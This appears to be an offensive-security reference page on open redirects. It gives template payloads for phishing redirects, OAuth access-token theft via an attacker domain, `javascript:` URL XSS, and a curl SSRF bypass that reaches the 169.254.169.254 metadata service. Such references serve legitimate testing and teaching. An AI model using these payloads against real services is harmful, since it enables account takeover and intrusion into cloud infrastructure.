# Open Redirect

## Table of Contents

- [Phishing](#phishing)
- [Account Takeover](#account-takeover)
- [XSS](#xss)
- [Chaining with SSRF](#chaining-with-ssrf)

## Phishing

### Users can be redirected to malicious sites, leading to phishing.

- Redirect to malicious domain
    ```text
    https://[VULNERABLE-SERVICE]/login?redirect_url=https%3A%2F%2F[ATTACKER-DOMAIN]%2F
    ```

## Account Takeover

### An OAuth token issued to the service can be forwarded to the attacker through the service's own redirect. [^1]

- Forwarding an access token in the URL fragment
    ```text
    https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&response_type=token&redirect_uri=https://[VULNERABLE-SERVICE]/login%3Fredirect_url%3Dhttps://[ATTACKER-DOMAIN]/
    ```
    The identity provider sends the token to the allowed domain in the URL fragment. The service then redirects to the attacker's page, and the browser carries the fragment over, so the attacker reads the token from `location.hash`. See [OAuth Misconfiguration](./OAuth_Misconfiguration.md).

## XSS

### When the redirect is performed by a script, a `javascript:` URL runs on the service's origin instead of navigating away. [^2]

- Redirecting to a `javascript:` URL
    1. Redirect in the service
        ```javascript
        location.href = new URLSearchParams(location.search).get('redirect_url');
        ```

    2. Request
        ```text
        https://[VULNERABLE-SERVICE]/login?redirect_url=javascript:alert(document.domain)
        ```

## Chaining with SSRF

### A server-side URL filter that only allows the service's own domain can be bypassed, because the server follows the redirect. [^3]

- Reaching the instance metadata through an allowed URL
    ```bash
    curl "https://[VULNERABLE-SERVICE]/translate?url=https://[VULNERABLE-SERVICE]/login%3Fredirect_url%3Dhttp://169.254.169.254/latest/meta-data/"
    ```
    The filter sees a URL on the service's own domain, and the HTTP client follows the redirect to the metadata service, as described in [SSRF](./SSRF.md).

[^1]: Applies when the identity provider accepts any path on the service's domain as `redirect_uri` and issues the token in the URL fragment (implicit flow).
[^2]: Applies when the redirect is implemented in JavaScript. A `javascript:` URL in a `Location` header is not executed.
[^3]: Applies when the server-side HTTP client follows redirects.
